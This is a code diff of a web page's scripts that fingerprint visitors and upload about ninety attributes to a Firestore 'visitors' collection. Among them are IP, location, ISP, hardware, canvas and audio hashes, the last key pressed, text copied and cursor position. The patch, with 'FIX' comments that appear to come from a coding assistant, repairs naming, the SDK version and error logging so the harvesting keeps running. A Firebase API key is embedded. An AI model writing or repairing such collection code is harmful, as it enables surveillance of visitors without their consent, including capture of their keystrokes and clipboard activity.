@@ -353,6 +353,7 @@ setTimeout(()=>{sv('i-history',history.length+' pages this session',history.leng
 setTimeout(()=>{const ref=document.referrer;if(ref){try{const u=new URL(ref);sv('i-referrer',u.hostname,'wn');}catch(e){sv('i-referrer',ref.slice(0,40),'wn');}}else{sv('i-referrer','Direct / Unknown','ok');}},200);
 
 // DEVICE / BROWSER
+// FIX: renamed local gcd result variable from 'g' to '_arVal' to avoid any naming confusion with the Firebase getVal function
 setTimeout(()=>{
   const ua=navigator.userAgent;
   let br='Unknown',os='Unknown',dev='Desktop';
@@ -375,12 +376,12 @@ setTimeout(()=>{
   sv('i-cpuarch',arch,'wn');
   sv('i-cpu',(navigator.hardwareConcurrency||'?')+' logical cores','wn');
   sv('i-ram',(navigator.deviceMemory||'?')+'GB (approx)','wn');
-  const gcd=(a,b)=>b===0?a:gcd(b,a%b);const g=gcd(screen.width,screen.height);
+  const gcdFn=(a,b)=>b===0?a:gcdFn(b,a%b);const _arVal=gcdFn(screen.width,screen.height);
   sv('i-scr',screen.width+'×'+screen.height,'wn');
   sv('i-scravail',screen.availWidth+'×'+screen.availHeight,'wn');
   const tw=screen.width-screen.availWidth,th=screen.height-screen.availHeight;
   sv('i-taskbar',(tw||th)?tw+'px H · '+th+'px V':'None detected','ok');
-  sv('i-aspect',screen.width/g+':'+screen.height/g,'wn');
+  sv('i-aspect',screen.width/_arVal+':'+screen.height/_arVal,'wn');
   sv('i-colordepth',screen.colorDepth+'-bit','wn');
   sv('i-dpr',window.devicePixelRatio+'x','wn');
   sv('i-vp',window.innerWidth+'×'+window.innerHeight,'wn');
@@ -414,7 +415,6 @@ setTimeout(()=>{
   sv('i-mime',navigator.mimeTypes?navigator.mimeTypes.length+' registered MIME types':'Not available','wn');
   sv('i-pdf',navigator.pdfViewerEnabled?'Enabled':'Disabled','wn');
   sv('i-inet',navigator.onLine?'Connected':'Offline',navigator.onLine?'ok':'hi');
-  sv('i-websocket','WebSocket' in window?'Supported':'Not Supported','ok');
 },200);
 
 // CONNECTION
@@ -514,13 +514,15 @@ setTimeout(()=>{try{const Ctx=window.AudioContext||window.webkitAudioContext;if(
 })();
 </script>
 
+<!-- FIX: Updated Firebase SDK from non-existent v12.9.0 to stable v10.14.1 -->
 <script type="module">
-import{initializeApp,getApps,getApp}from"https://www.gstatic.com/firebasejs/12.9.0/firebase-app.js";
-import{getFirestore,collection,addDoc}from"https://www.gstatic.com/firebasejs/12.9.0/firebase-firestore.js";
+import{initializeApp,getApps,getApp}from"https://www.gstatic.com/firebasejs/10.14.1/firebase-app.js";
+import{getFirestore,collection,addDoc}from"https://www.gstatic.com/firebasejs/10.14.1/firebase-firestore.js";
 const _cfg={apiKey:"AIzaSyBl4bO6hNumDov3d26YNFj1y7Id498rBTU",authDomain:"rh2-systems.firebaseapp.com",projectId:"rh2-systems",storageBucket:"rh2-systems.firebasestorage.app",messagingSenderId:"492917852953",appId:"1:492917852953:web:9fc6ff86f6fcd2fc965388"};
 const app=getApps().length?getApp():initializeApp(_cfg);
 const db=getFirestore(app);
-const g=id=>{const el=document.getElementById(id);return el?el.textContent.trim():'—';};
+// FIX: renamed from 'g' to 'getVal' to avoid naming ambiguity with the gcd variable in the non-module script
+const getVal=id=>{const el=document.getElementById(id);return el?el.textContent.trim():'—';};
 const sb=document.getElementById('status-txt'),dot=document.getElementById('sdot');
 const sv2=(id,val,cls)=>{const el=document.getElementById(id);if(!el)return;el.textContent=val;el.classList.remove('ld');el.className=cls?'row-val '+cls:'row-val';};
 const sv=(id,val,cls)=>{sv2(id,val,cls);if(typeof window._tick==='function')window._tick();};
@@ -610,40 +612,41 @@ async function scanIncognito(){
   try{
     await addDoc(collection(db,'visitors'),{
       timestamp:new Date(),
-      ip:g('i-ip'),country:g('i-country'),city:g('i-city'),isp:g('i-isp'),timezone:g('i-tz'),
-      connection:g('i-conn'),speed:g('i-speed'),rtt:g('i-rtt-disp'),http:g('i-http'),inet:g('i-inet'),
-      webrtc:g('i-webrtc'),iceCandidates:g('i-ice'),iceInference:g('i-ice-inf'),
-      tls:g('i-tls'),secureContext:g('i-secure'),tlsGrade:g('i-tlsgrade'),
-      browser:g('i-br'),buildId:g('i-buildid'),os:g('i-os'),device:g('i-dev'),
-      platform:g('i-platform'),cpuArch:g('i-cpuarch'),cpu:g('i-cpu'),ram:g('i-ram'),
-      screen:g('i-scr'),availScreen:g('i-scravail'),taskbar:g('i-taskbar'),
-      aspectRatio:g('i-aspect'),colorDepth:g('i-colordepth'),dpr:g('i-dpr'),
-      viewport:g('i-vp'),orientation:g('i-orient'),fullscreen:g('i-fullscreen'),
-      colorGamut:g('i-gamut'),hdr:g('i-hdr'),gpuVendor:g('i-gpuv'),gpuRenderer:g('i-gpur'),
-      pointer:g('i-pointer'),touch:g('i-touch'),mediaDevices:g('i-mediadevices'),
-      speakers:g('i-speakers'),bluetooth:g('i-bluetooth'),vibration:g('i-vibration'),
-      gamepad:g('i-gamepad'),devOrientation:g('i-devorientation'),battery:g('i-battery'),
-      wasm:g('i-wasm'),serviceWorker:g('i-sw'),webgl1:g('i-webgl1'),webgl2:g('i-webgl2'),
-      websocket:g('i-websocket'),geoApi:g('i-geoapi'),paymentApi:g('i-payment'),
-      wakeLock:g('i-wakelock'),vibrationApi:g('i-vibration'),gamepadApi:g('i-gamepad'),
-      mimeTypes:g('i-mime'),pdf:g('i-pdf'),speech:g('i-speech'),speechVoices:g('i-voices'),
-      reducedMotion:g('i-motion'),cookies:g('i-cookies'),
-      localStorage:g('i-ls'),sessionStorage:g('i-ss'),idb:g('i-idb'),
-      storageQuota:g('i-quota'),storageUsed:g('i-quotaused'),
-      incognito:g('i-incognito'),dnt:g('i-dnt'),adBlocker:g('i-adblocker'),
-      popupBlocker:g('i-popup'),notification:g('i-notif'),clipboard:g('i-clipboard'),
-      tracking:g('i-tracking'),fpResist:g('i-fpresist'),canvasSpoofed:g('i-cvspoofed'),
-      theme:g('i-theme'),canvasHash:g('i-canvas'),audioHash:g('i-audio'),
-      fonts:g('i-fonts'),languages:g('i-lang'),entropy:g('i-entropy'),uniqueness:g('i-unique'),
-      lastKey:g('i-lastkey'),capsLock:g('i-capslock'),textCopied:g('i-copy'),cursorPos:g('i-mouse'),
-      timeOnPage:g('i-timeonpage'),scrollDepth:g('i-scroll'),tabSwitches:g('i-tabswitch'),
-      sessionId:g('i-sid'),localTime:g('i-time'),pageLoad:g('i-load'),
-      referrer:g('i-referrer'),historyLength:g('i-history'),
+      ip:getVal('i-ip'),country:getVal('i-country'),city:getVal('i-city'),isp:getVal('i-isp'),timezone:getVal('i-tz'),
+      connection:getVal('i-conn'),speed:getVal('i-speed'),rtt:getVal('i-rtt-disp'),http:getVal('i-http'),inet:getVal('i-inet'),
+      webrtc:getVal('i-webrtc'),iceCandidates:getVal('i-ice'),iceInference:getVal('i-ice-inf'),
+      tls:getVal('i-tls'),secureContext:getVal('i-secure'),tlsGrade:getVal('i-tlsgrade'),
+      browser:getVal('i-br'),buildId:getVal('i-buildid'),os:getVal('i-os'),device:getVal('i-dev'),
+      platform:getVal('i-platform'),cpuArch:getVal('i-cpuarch'),cpu:getVal('i-cpu'),ram:getVal('i-ram'),
+      screen:getVal('i-scr'),availScreen:getVal('i-scravail'),taskbar:getVal('i-taskbar'),
+      aspectRatio:getVal('i-aspect'),colorDepth:getVal('i-colordepth'),dpr:getVal('i-dpr'),
+      viewport:getVal('i-vp'),orientation:getVal('i-orient'),fullscreen:getVal('i-fullscreen'),
+      colorGamut:getVal('i-gamut'),hdr:getVal('i-hdr'),gpuVendor:getVal('i-gpuv'),gpuRenderer:getVal('i-gpur'),
+      pointer:getVal('i-pointer'),touch:getVal('i-touch'),mediaDevices:getVal('i-mediadevices'),
+      speakers:getVal('i-speakers'),bluetooth:getVal('i-bluetooth'),vibration:getVal('i-vibration'),
+      gamepad:getVal('i-gamepad'),devOrientation:getVal('i-devorientation'),battery:getVal('i-battery'),
+      wasm:getVal('i-wasm'),serviceWorker:getVal('i-sw'),webgl1:getVal('i-webgl1'),webgl2:getVal('i-webgl2'),
+      websocket:getVal('i-websocket'),geoApi:getVal('i-geoapi'),paymentApi:getVal('i-payment'),
+      wakeLock:getVal('i-wakelock'),vibrationApi:getVal('i-vibration'),gamepadApi:getVal('i-gamepad'),
+      mimeTypes:getVal('i-mime'),pdf:getVal('i-pdf'),speech:getVal('i-speech'),speechVoices:getVal('i-voices'),
+      reducedMotion:getVal('i-motion'),cookies:getVal('i-cookies'),
+      localStorage:getVal('i-ls'),sessionStorage:getVal('i-ss'),idb:getVal('i-idb'),
+      storageQuota:getVal('i-quota'),storageUsed:getVal('i-quotaused'),
+      incognito:getVal('i-incognito'),dnt:getVal('i-dnt'),adBlocker:getVal('i-adblocker'),
+      popupBlocker:getVal('i-popup'),notification:getVal('i-notif'),clipboard:getVal('i-clipboard'),
+      tracking:getVal('i-tracking'),fpResist:getVal('i-fpresist'),canvasSpoofed:getVal('i-cvspoofed'),
+      theme:getVal('i-theme'),canvasHash:getVal('i-canvas'),audioHash:getVal('i-audio'),
+      fonts:getVal('i-fonts'),languages:getVal('i-lang'),entropy:getVal('i-entropy'),uniqueness:getVal('i-unique'),
+      lastKey:getVal('i-lastkey'),capsLock:getVal('i-capslock'),textCopied:getVal('i-copy'),cursorPos:getVal('i-mouse'),
+      timeOnPage:getVal('i-timeonpage'),scrollDepth:getVal('i-scroll'),tabSwitches:getVal('i-tabswitch'),
+      sessionId:getVal('i-sid'),localTime:getVal('i-time'),pageLoad:getVal('i-load'),
+      referrer:getVal('i-referrer'),historyLength:getVal('i-history'),
       pageUrl:window.location.href,userAgent:navigator.userAgent,_source:'phantom_v3',
     });
     if(sb)sb.textContent='Signal acquired · Logged ✓';
     if(dot){dot.style.background='var(--neon)';dot.style.boxShadow='0 0 8px var(--neon)';}
   }catch(e){
+    console.error('Firebase write error:',e);
     if(sb)sb.textContent='Scan complete · Log failed';
     if(dot){dot.style.background='var(--bad)';dot.style.boxShadow='0 0 8px var(--bad)';}
   }
